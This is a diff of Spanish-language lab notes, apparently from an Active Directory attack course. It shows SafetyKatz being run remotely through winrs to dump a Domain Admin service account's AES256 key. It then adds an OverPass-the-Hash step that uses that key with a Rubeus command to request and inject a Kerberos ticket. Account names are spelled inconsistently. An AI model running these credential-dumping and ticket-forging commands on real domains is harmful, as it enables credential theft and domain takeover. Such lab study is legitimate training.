@@ -474,4 +474,11 @@ Para ejecutar *SafetyKatz* en *dcorp-mgmt* lo descargaremos y lo ejecutaremos en
 $null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
 ```
 
-Obteniendo asi credenciales de *scadmin -> 6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011* que es un *Domain Admin*. Esta se utiliza como cuenta de servicio (En el parametro Session se indica como 0, por lo cual es una cuenta de servicio)
+Obteniendo asi credenciales de *scvadmin -> 6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011* que es un *Domain Admin*. Esta se utiliza como cuenta de servicio (En el parametro Session se indica como 0, por lo cual es una cuenta de servicio)
+
+Para poder usar las credneciales de *svcadmin* deberemos de realizas
+### OverPass-the-Hash
+Deberemos de ejejecutar los siguiente comando desde una terminal con privilegios de *Local Admin* para asi poder ejecutar *Rubeus*.
+```shell
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
